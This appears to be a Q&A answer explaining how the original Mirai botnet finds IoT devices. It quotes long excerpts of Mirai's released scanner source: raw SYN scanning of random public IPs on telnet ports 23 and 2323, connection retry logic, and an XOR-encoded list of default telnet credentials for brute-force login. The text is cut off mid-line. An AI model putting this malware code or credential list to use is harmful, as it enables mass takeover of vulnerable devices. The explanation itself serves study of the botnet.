User: 请解答这个和日志有关的问题How Mirai scans or find targets I read some articles about the Mirai botnet.
I can't understand how Mirai scans/finds IoT devices.
Does Mirai scan the entire public IP range with an open telnet port and try to log in?

Assistant: The original Mirai looks for devices with busybox installed. This answer is directed at the original Mirai. As you know Mirai source codes are now public and it is not surprising to see variants of Mirai in the wild performing different if not more sophisticated attacks.

If you like to know how Mirai communicates with it's C&amp;C. Check out similar question "How does Mirai's C&amp;C communicate with its bots?".

Here instead is the explanation on "How Mirai Targets." 


SYN scanning on socket is done and traversing accross various target IP addresses. It's used because it's fast and the ability to probe multiple ports

// Set up raw socket scanning and payload
if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
{
#ifdef DEBUG
    printf("[scanner] Failed to initialize raw socket, cannot scan\n");
#endif
    exit(0);
}

Getting responses

    if (fake_time != last_spew)
    {
        last_spew = fake_time;

        for (i = 0; i &lt; SCANNER_RAW_PPS; i++)
        {
            struct sockaddr_in paddr = {0};
            struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

            iph-&gt;id = rand_next();
            iph-&gt;saddr = LOCAL_ADDR;
            iph-&gt;daddr = get_random_ip();
            iph-&gt;check = 0;
            iph-&gt;check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            if (i % 10 == 0)
            {
                tcph-&gt;dest = htons(2323);
            }
            else
            {
                tcph-&gt;dest = htons(23);
            }
            tcph-&gt;seq = iph-&gt;daddr;
            tcph-&gt;check = 0;
            tcph-&gt;check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

            paddr.sin_family = AF_INET;
            paddr.sin_addr.s_addr = iph-&gt;daddr;
            paddr.sin_port = tcph-&gt;dest;

            sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&amp;paddr, sizeof (paddr));
        }
    }


And getting random ip to target

static ipv4_t get_random_ip(void)
{
uint32_t tmp;
uint8_t o1, o2, o3, o4;
do
{
    tmp = rand_next();

    o1 = tmp &amp; 0xff;
    o2 = (tmp &gt;&gt; 8) &amp; 0xff;
    o3 = (tmp &gt;&gt; 16) &amp; 0xff;
    o4 = (tmp &gt;&gt; 24) &amp; 0xff;
}
while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
      (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
      (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
      (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
      (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
      (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
      (o1 == 192 &amp;&amp; o2 == 168) ||               // 192.168.0.0/16   - Internal network
      (o1 == 172 &amp;&amp; o2 &gt;= 16 &amp;&amp; o2 &lt; 32) ||     // 172.16.0.0/14    - Internal network
      (o1 == 100 &amp;&amp; o2 &gt;= 64 &amp;&amp; o2 &lt; 127) ||    // 100.64.0.0/10    - IANA NAT reserved
      (o1 == 169 &amp;&amp; o2 &gt; 254) ||                // 169.254.0.0/16   - IANA NAT reserved
      (o1 == 198 &amp;&amp; o2 &gt;= 18 &amp;&amp; o2 &lt; 20) ||     // 198.18.0.0/15    - IANA Special use
      (o1 &gt;= 224) ||                            // 224.*.*.*+       - Multicast
      (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
);

return INET_ADDR(o1,o2,o3,o4);
}

Send ACK packet and receive the response from target and perform analysis if a port is open. Targeting TCP/23 and TCP/2323

last_avail_conn = 0;
while (TRUE)
{
int n;
char dgram[1514];
struct iphdr *iph = (struct iphdr *)dgram;
struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
struct scanner_connection *conn;

errno = 0;
n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
if (n &lt;= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
    break;

if (n &lt; sizeof(struct iphdr) + sizeof(struct tcphdr))
    continue;
if (iph-&gt;daddr != LOCAL_ADDR)
    continue;
if (iph-&gt;protocol != IPPROTO_TCP)
    continue;
if (tcph-&gt;source != htons(23) &amp;&amp; tcph-&gt;source != htons(2323))
    continue;
if (tcph-&gt;dest != source_port)
    continue;
if (!tcph-&gt;syn)
    continue;
if (!tcph-&gt;ack)
    continue;
if (tcph-&gt;rst)
    continue;
if (tcph-&gt;fin)
    continue;
if (htonl(ntohl(tcph-&gt;ack_seq) - 1) != iph-&gt;saddr)
    continue;

conn = NULL;
for (n = last_avail_conn; n &lt; SCANNER_MAX_CONNS; n++)
{
    if (conn_table[n].state == SC_CLOSED)
    {
        conn = &amp;conn_table[n];
        last_avail_conn = n;
        break;
    }
}

Once the above are done. A TCP Session is then Established

    FD_ZERO(&amp;fdset_rd);
    FD_ZERO(&amp;fdset_wr);
    for (i = 0; i &lt; SCANNER_MAX_CONNS; i++)
    {
        int timeout;

        conn = &amp;conn_table[i];
        timeout = (conn-&gt;state &gt; SC_CONNECTING ? 30 : 5);

        if (conn-&gt;state != SC_CLOSED &amp;&amp; (fake_time - conn-&gt;last_recv) &gt; timeout)
        {
#ifdef DEBUG
            printf("[scanner] FD%d timed out (state = %d)\n", conn-&gt;fd, conn-&gt;state);
#endif
            close(conn-&gt;fd);
            conn-&gt;fd = -1;

            // Retry
            if (conn-&gt;state &gt; SC_HANDLE_IACS) // If we were at least able to connect, try again
            {
                if (++(conn-&gt;tries) == 10)
                {
                    conn-&gt;tries = 0;
                    conn-&gt;state = SC_CLOSED;
                }
                else
                {
                    setup_connection(conn);
#ifdef DEBUG
                    printf("[scanner] FD%d retrying with different auth combo!\n", conn-&gt;fd);
#endif
                }
            }
            else
            {
                conn-&gt;tries = 0;
                conn-&gt;state = SC_CLOSED;
            }
            continue;
        }

Password Enumeration

        if (FD_ISSET(conn-&gt;fd, &amp;fdset_rd))
        {
            while (TRUE)
            {
                int ret;

                if (conn-&gt;state == SC_CLOSED)
                    break;

                if (conn-&gt;rdbuf_pos == SCANNER_RDBUF_SIZE)
                {
                    memmove(conn-&gt;rdbuf, conn-&gt;rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                    conn-&gt;rdbuf_pos -= SCANNER_HACK_DRAIN;
                }
                errno = 0;
                ret = recv_strip_null(conn-&gt;fd, conn-&gt;rdbuf + conn-&gt;rdbuf_pos, SCANNER_RDBUF_SIZE - conn-&gt;rdbuf_pos, MSG_NOSIGNAL);
                if (ret == 0)
                {
#ifdef DEBUG
                    printf("[scanner] FD%d connection gracefully closed\n", conn-&gt;fd);
#endif
                    errno = ECONNRESET;
                    ret = -1; // Fall through to closing connection below
                }
                if (ret == -1)
                {
                    if (errno != EAGAIN &amp;&amp; errno != EWOULDBLOCK)
                    {
#ifdef DEBUG
                        printf("[scanner] FD%d lost connection\n", conn-&gt;fd);
#endif
                        close(conn-&gt;fd);
                        conn-&gt;fd = -1;

                        // Retry
                        if (++(conn-&gt;tries) &gt;= 10)
                        {
                            conn-&gt;tries = 0;
                            conn-&gt;state = SC_CLOSED;
                        }
                        else
                        {
                            setup_connection(conn);
#ifdef DEBUG
                            printf("[scanner] FD%d retrying with different auth combo!\n", conn-&gt;fd);
#endif
                        }
                    }

Attempts using common weak passwords and default passwords.

add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc
add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default
 add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              // root     juantech
add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      // root     123456
add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321
add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 5);      // support  support
add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                              // root     (none)
add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);          // admin    password
add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);                              // root     root
add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                          // root     12345
add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 3);                              // user     user
add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 3);                                          // admin    (none)
add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 3);                              // root     pass
add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16", 3);      // admin    admin1234
add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 3);                              // root     1111
add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x4F\x41\x43\x46\x4F\x4B\x4C", 3);          // admin    smcadmin
add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13", 2);                          // admin    1111
add_auth_entry("\x50\x4D\x4D\x56", "\x14\x14\x14\x14\x14\x14", 2);                      // root     666666
add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 2);              // root     password
add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16", 2);                              // root     1234
add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11", 1);                      // root     klv123
add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x4F\x47\x4B\x4C\x51\x4F", 1); // Administrator admin
add_auth_entry("\x51\x47\x50\x54\x4B\x41\x47", "\x51\x47\x50\x54\x4B\x41\x47", 1);      // service  service
add_auth_entry("\x51\x57\x